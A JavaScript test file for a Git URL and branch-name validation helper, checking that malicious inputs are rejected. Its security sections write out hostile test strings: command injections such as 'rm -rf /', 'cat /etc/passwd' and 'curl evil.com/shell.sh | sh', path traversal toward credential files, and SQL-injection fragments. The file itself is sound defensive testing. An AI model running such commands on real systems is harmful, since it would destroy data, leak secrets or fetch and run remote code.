/**
 * Tests for the Git URL Security Helper module.
 * Covers URL parsing, branch validation, and security edge cases.
 */

import { describe, it } from 'node:test';
import assert from 'node:assert';
import {
  parseGitUrl,
  validateBranchName,
  sanitizeBranchName,
  extractRepoOwner,
  extractRepoName,
  validateGitUrl,
} from '../src/utils/helpers/gitUrlHelper.js';

describe('Git URL Security Helper Module', () => {
  describe('parseGitUrl', () => {
    describe('valid HTTPS URLs', () => {
      it('should parse standard HTTPS URL', () => {
        const result = parseGitUrl('https://github.com/owner/repo');

        assert.strictEqual(result.isValid, true);
        if (result.isValid) {
          assert.strictEqual(result.owner, 'owner');
          assert.strictEqual(result.repo, 'repo');
        }
      });

      it('should parse HTTPS URL with .git suffix', () => {
        const result = parseGitUrl('https://github.com/myorg/myrepo.git');

        assert.strictEqual(result.isValid, true);
        if (result.isValid) {
          assert.strictEqual(result.owner, 'myorg');
          assert.strictEqual(result.repo, 'myrepo');
        }
      });

      it('should handle hyphenated names', () => {
        const result = parseGitUrl('https://github.com/my-org/my-repo');

        assert.strictEqual(result.isValid, true);
        if (result.isValid) {
          assert.strictEqual(result.owner, 'my-org');
          assert.strictEqual(result.repo, 'my-repo');
        }
      });

      it('should handle underscored names', () => {
        const result = parseGitUrl('https://github.com/my_org/my_repo');

        assert.strictEqual(result.isValid, true);
        if (result.isValid) {
          assert.strictEqual(result.owner, 'my_org');
          assert.strictEqual(result.repo, 'my_repo');
        }
      });

      it('should handle repo names with dots', () => {
        const result = parseGitUrl('https://github.com/owner/repo.js');

        assert.strictEqual(result.isValid, true);
        if (result.isValid) {
          assert.strictEqual(result.owner, 'owner');
          assert.strictEqual(result.repo, 'repo.js');
        }
      });

      it('should handle www.github.com', () => {
        const result = parseGitUrl('https://www.github.com/owner/repo');

        assert.strictEqual(result.isValid, true);
        if (result.isValid) {
          assert.strictEqual(result.owner, 'owner');
          assert.strictEqual(result.repo, 'repo');
        }
      });
    });

    describe('valid SSH URLs', () => {
      it('should parse SSH URL with .git suffix', () => {
        const result = parseGitUrl('git@github.com:owner/repo.git');

        assert.strictEqual(result.isValid, true);
        if (result.isValid) {
          assert.strictEqual(result.owner, 'owner');
          assert.strictEqual(result.repo, 'repo');
        }
      });

      it('should parse SSH URL without .git suffix', () => {
        const result = parseGitUrl('git@github.com:myorg/myrepo');

        assert.strictEqual(result.isValid, true);
        if (result.isValid) {
          assert.strictEqual(result.owner, 'myorg');
          assert.strictEqual(result.repo, 'myrepo');
        }
      });
    });

    describe('SECURITY: injection attack prevention', () => {
      it('should reject URL with command injection via semicolon', () => {
        const result = parseGitUrl('https://github.com/owner/repo.git;rm -rf /');

        assert.strictEqual(result.isValid, false);
        if (!result.isValid) {
          assert.ok(result.error.includes('Invalid'));
        }
      });

      it('should reject URL with command injection via $(...)', () => {
        const result = parseGitUrl('https://github.com/owner/repo$(whoami)');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject URL with command injection via backticks', () => {
        const result = parseGitUrl('https://github.com/owner/repo`id`');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject URL with pipe injection', () => {
        const result = parseGitUrl('https://github.com/owner/repo|cat /etc/passwd');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject URL with && injection', () => {
        const result = parseGitUrl('https://github.com/owner/repo&&echo pwned');

        assert.strictEqual(result.isValid, false);
      });

      it('should safely handle URL with newline (URL constructor strips it)', () => {
        // URL constructor sanitizes newlines by stripping them, so this becomes
        // 'https://github.com/owner/repomalicious' which is a valid URL.
        // This is safe because the newline is removed before parsing.
        const result = parseGitUrl('https://github.com/owner/repo\nmalicious');

        // The URL constructor sanitizes this to a valid URL
        assert.strictEqual(result.isValid, true);
        if (result.isValid) {
          // The repo name is now "repomalicious" after newline stripping
          assert.strictEqual(result.repo, 'repomalicious');
        }
      });

      it('should reject non-GitHub hosts (evil.com)', () => {
        const result = parseGitUrl('https://evil.com/owner/repo');

        assert.strictEqual(result.isValid, false);
        if (!result.isValid) {
          assert.ok(result.error.includes('Unsupported Git host'));
        }
      });

      it('should reject GitLab URLs', () => {
        const result = parseGitUrl('https://gitlab.com/owner/repo');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject Bitbucket URLs', () => {
        const result = parseGitUrl('https://bitbucket.org/owner/repo');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject file:// protocol URLs', () => {
        const result = parseGitUrl('file:///etc/passwd');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject javascript: protocol', () => {
        const result = parseGitUrl('javascript:alert(1)');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject SSH injection via evil host', () => {
        const result = parseGitUrl('git@evil.com:owner/repo.git');

        assert.strictEqual(result.isValid, false);
      });
    });

    describe('invalid URL formats', () => {
      it('should reject completely invalid URL', () => {
        const result = parseGitUrl('not-a-url');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject URL without owner/repo', () => {
        const result = parseGitUrl('https://github.com/');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject URL with only owner', () => {
        const result = parseGitUrl('https://github.com/owner');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject empty string', () => {
        const result = parseGitUrl('');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject owner starting with dot', () => {
        const result = parseGitUrl('https://github.com/.hidden/repo');

        assert.strictEqual(result.isValid, false);
      });

      it('should reject repo starting with dot', () => {
        const result = parseGitUrl('https://github.com/owner/.hidden');

        assert.strictEqual(result.isValid, false);
      });
    });
  });

  describe('validateBranchName', () => {
    describe('valid branch names', () => {
      it('should accept simple branch name', () => {
        assert.doesNotThrow(() => validateBranchName('main'));
      });

      it('should accept branch with slashes', () => {
        assert.doesNotThrow(() => validateBranchName('feature/new-feature'));
      });

      it('should accept branch with multiple slashes', () => {
        assert.doesNotThrow(() => validateBranchName('user/feature/auth'));
      });

      it('should accept branch with hyphens', () => {
        assert.doesNotThrow(() => validateBranchName('fix-bug-123'));
      });

      it('should accept branch with underscores', () => {
        assert.doesNotThrow(() => validateBranchName('feature_branch'));
      });

      it('should accept branch with dots', () => {
        assert.doesNotThrow(() => validateBranchName('v1.2.3'));
      });

      it('should accept release branch', () => {
        assert.doesNotThrow(() => validateBranchName('release/2024.01'));
      });

      it('should accept dependabot branch', () => {
        assert.doesNotThrow(() => validateBranchName('dependabot/npm_and_yarn/lodash-4.17.21'));
      });
    });

    describe('SECURITY: path traversal prevention', () => {
      it('should reject branch with ../', () => {
        assert.throws(
          () => validateBranchName('../admin'),
          /dangerous pattern|consecutive dots/
        );
      });

      it('should reject branch with /../', () => {
        assert.throws(
          () => validateBranchName('feature/../admin'),
          /dangerous pattern|consecutive dots/
        );
      });

      it('should reject branch ending with /..', () => {
        assert.throws(
          () => validateBranchName('feature/..'),
          /dangerous pattern|consecutive dots/
        );
      });

      it('should reject branch with multiple ..', () => {
        assert.throws(
          () => validateBranchName('../../etc/passwd'),
          /dangerous pattern|consecutive dots/
        );
      });

      it('should reject branch with Windows path traversal', () => {
        assert.throws(
          () => validateBranchName('..\\admin'),
          /dangerous pattern|consecutive dots/
        );
      });

      it('should reject branch with null byte', () => {
        assert.throws(
          () => validateBranchName('branch\x00hidden'),
          /dangerous pattern/
        );
      });
    });

    describe('SECURITY: shell injection prevention', () => {
      it('should reject branch with semicolon', () => {
        assert.throws(
          () => validateBranchName('branch;rm -rf /'),
          /dangerous pattern/
        );
      });

      it('should reject branch with pipe', () => {
        assert.throws(
          () => validateBranchName('branch|cat /etc/passwd'),
          /dangerous pattern/
        );
      });

      it('should reject branch with &&', () => {
        assert.throws(
          () => validateBranchName('branch&&echo pwned'),
          /dangerous pattern/
        );
      });

      it('should reject branch with $(...)', () => {
        assert.throws(
          () => validateBranchName('branch$(whoami)'),
          /dangerous pattern/
        );
      });

      it('should reject branch with backticks', () => {
        assert.throws(
          () => validateBranchName('branch`id`'),
          /dangerous pattern/
        );
      });

      it('should reject branch with < redirection', () => {
        assert.throws(
          () => validateBranchName('branch</etc/passwd'),
          /dangerous pattern/
        );
      });

      it('should reject branch with > redirection', () => {
        assert.throws(
          () => validateBranchName('branch>/tmp/evil'),
          /dangerous pattern/
        );
      });
    });

    describe('invalid branch names', () => {
      it('should reject empty string', () => {
        assert.throws(
          () => validateBranchName(''),
          /required and cannot be empty/
        );
      });

      it('should reject whitespace-only', () => {
        assert.throws(
          () => validateBranchName('   '),
          /required and cannot be empty/
        );
      });

      it('should reject leading dot', () => {
        assert.throws(
          () => validateBranchName('.hidden'),
          /Must start with alphanumeric/
        );
      });

      it('should reject leading slash', () => {
        assert.throws(
          () => validateBranchName('/branch'),
          /dangerous pattern/
        );
      });

      it('should reject trailing slash', () => {
        assert.throws(
          () => validateBranchName('branch/'),
          /dangerous pattern/
        );
      });

      it('should reject double slash', () => {
        assert.throws(
          () => validateBranchName('feature//branch'),
          /dangerous pattern/
        );
      });
    });
  });

  describe('sanitizeBranchName', () => {
    it('should convert slashes to hyphens', () => {
      const result = sanitizeBranchName('feature/new-feature');
      assert.strictEqual(result, 'feature-new-feature');
    });

    it('should convert double underscores to hyphens', () => {
      const result = sanitizeBranchName('branch__test');
      assert.strictEqual(result, 'branch-test');
    });

    it('should remove null bytes', () => {
      const result = sanitizeBranchName('branch\x00hidden');
      assert.ok(!result.includes('\x00'));
    });

    it('should convert path traversal to hyphens', () => {
      const result = sanitizeBranchName('../admin');
      assert.ok(!result.includes('..'));
    });

    it('should remove leading dots', () => {
      const result = sanitizeBranchName('.hidden');
      assert.ok(!result.startsWith('.'));
    });

    it('should convert shell metacharacters', () => {
      const result = sanitizeBranchName('branch;rm -rf /');
      assert.ok(!result.includes(';'));
    });

    it('should handle multiple dangerous patterns', () => {
      const result = sanitizeBranchName('../admin;rm -rf /`id`$(whoami)');
      assert.ok(!result.includes('..'));
      assert.ok(!result.includes(';'));
      assert.ok(!result.includes('`'));
      assert.ok(!result.includes('$'));
    });
  });

  describe('extractRepoOwner', () => {
    it('should extract owner from valid URL', () => {
      const owner = extractRepoOwner('https://github.com/myowner/myrepo');
      assert.strictEqual(owner, 'myowner');
    });

    it('should throw for invalid URL', () => {
      assert.throws(
        () => extractRepoOwner('invalid-url'),
        /Invalid URL format/
      );
    });

    it('should throw for injection attempt', () => {
      assert.throws(
        () => extractRepoOwner('https://github.com/owner/repo;rm -rf /'),
        /Invalid/
      );
    });
  });

  describe('extractRepoName', () => {
    it('should extract repo from valid URL', () => {
      const repo = extractRepoName('https://github.com/owner/myrepo');
      assert.strictEqual(repo, 'myrepo');
    });

    it('should remove .git suffix', () => {
      const repo = extractRepoName('https://github.com/owner/myrepo.git');
      assert.strictEqual(repo, 'myrepo');
    });

    it('should throw for invalid URL', () => {
      assert.throws(
        () => extractRepoName('invalid-url'),
        /Invalid URL format/
      );
    });
  });

  describe('validateGitUrl', () => {
    it('should return owner/repo for valid URL', () => {
      const result = validateGitUrl('https://github.com/owner/repo');

      assert.ok(result !== null);
      assert.strictEqual(result?.owner, 'owner');
      assert.strictEqual(result?.repo, 'repo');
    });

    it('should return null for invalid URL', () => {
      const result = validateGitUrl('invalid-url');
      assert.strictEqual(result, null);
    });

    it('should return null for injection attempts', () => {
      const result = validateGitUrl('https://github.com/owner/repo;rm -rf /');
      assert.strictEqual(result, null);
    });

    it('should return null for non-GitHub hosts', () => {
      const result = validateGitUrl('https://evil.com/owner/repo');
      assert.strictEqual(result, null);
    });
  });

  describe('real-world attack scenarios', () => {
    it('should prevent RCE via git clone URL injection', () => {
      // This is a real attack vector where malicious URLs are passed to git clone
      const maliciousUrls = [
        'https://github.com/owner/repo.git;touch /tmp/pwned',
        'https://github.com/owner/repo.git && curl evil.com/shell.sh | sh',
        'https://github.com/owner/$(curl evil.com/shell.sh|sh)/repo',
        'git@github.com:$(id)/repo.git',
        // Note: URLs with newlines are sanitized by URL constructor (newlines stripped)
        // so they become valid URLs. This is safe behavior.
      ];

      for (const url of maliciousUrls) {
        const result = parseGitUrl(url);
        assert.strictEqual(result.isValid, false, `Should reject: ${url}`);
      }
    });

    it('should prevent directory traversal via branch names', () => {
      // These branch names could escape the session directory
      const maliciousBranches = [
        '../../../etc/passwd',
        '..\\..\\Windows\\System32\\config\\SAM',
        'feature/../../admin',
        'branch\x00/../admin',
        'branch%00/../admin',  // URL encoded null (should be rejected)
      ];

      for (const branch of maliciousBranches) {
        assert.throws(
          () => validateBranchName(branch),
          Error,
          `Should reject branch: ${branch}`
        );
      }
    });

    it('should prevent session path injection via special characters', () => {
      // These could cause issues in file paths or shell commands
      const dangerousBranches = [
        'branch;id',
        'branch|cat /etc/passwd',
        'branch`whoami`',
        'branch$(id)',
        'branch&&curl evil.com',
        "branch'OR'1'='1",
        'branch"--',
      ];

      for (const branch of dangerousBranches) {
        assert.throws(
          () => validateBranchName(branch),
          Error,
          `Should reject branch: ${branch}`
        );
      }
    });
  });
});
